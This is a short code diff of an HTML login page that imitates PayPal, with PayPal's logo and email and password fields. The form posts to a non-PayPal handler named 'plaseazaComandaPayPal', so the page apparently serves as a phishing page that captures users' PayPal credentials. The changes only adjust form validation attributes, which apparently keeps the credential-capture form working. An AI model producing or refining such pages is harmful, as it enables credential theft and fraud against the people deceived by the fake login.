@@ -18,18 +18,18 @@
                 <header>
                     <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
                   </header>
-                <form action="plaseazaComandaPayPal" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
+                <form action="plaseazaComandaPayPal" method="post" class="proceed maskable" name="login" autocomplete="off">
                     <div id="passwordSection" class="clearfix">
                         <div class="textInput" id="login_emaildiv">
                             <div class="fieldWrapper">
                                 <label for="email" class="fieldLabel">Email</label>
-                                <input  name="email" id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email">
+                                <input name="email" id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required aria-required="true" value="" autocomplete="off" placeholder="Email">
                            </div>
                         </div>
                         
                      <div class="textInput lastInputField" id="login_passworddiv">
                          <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
-                            <input name="password" id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password">
+                            <input name="password" id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required aria-required="true" value="" placeholder="Password">
                        </div>
                      </div>
                    </div>
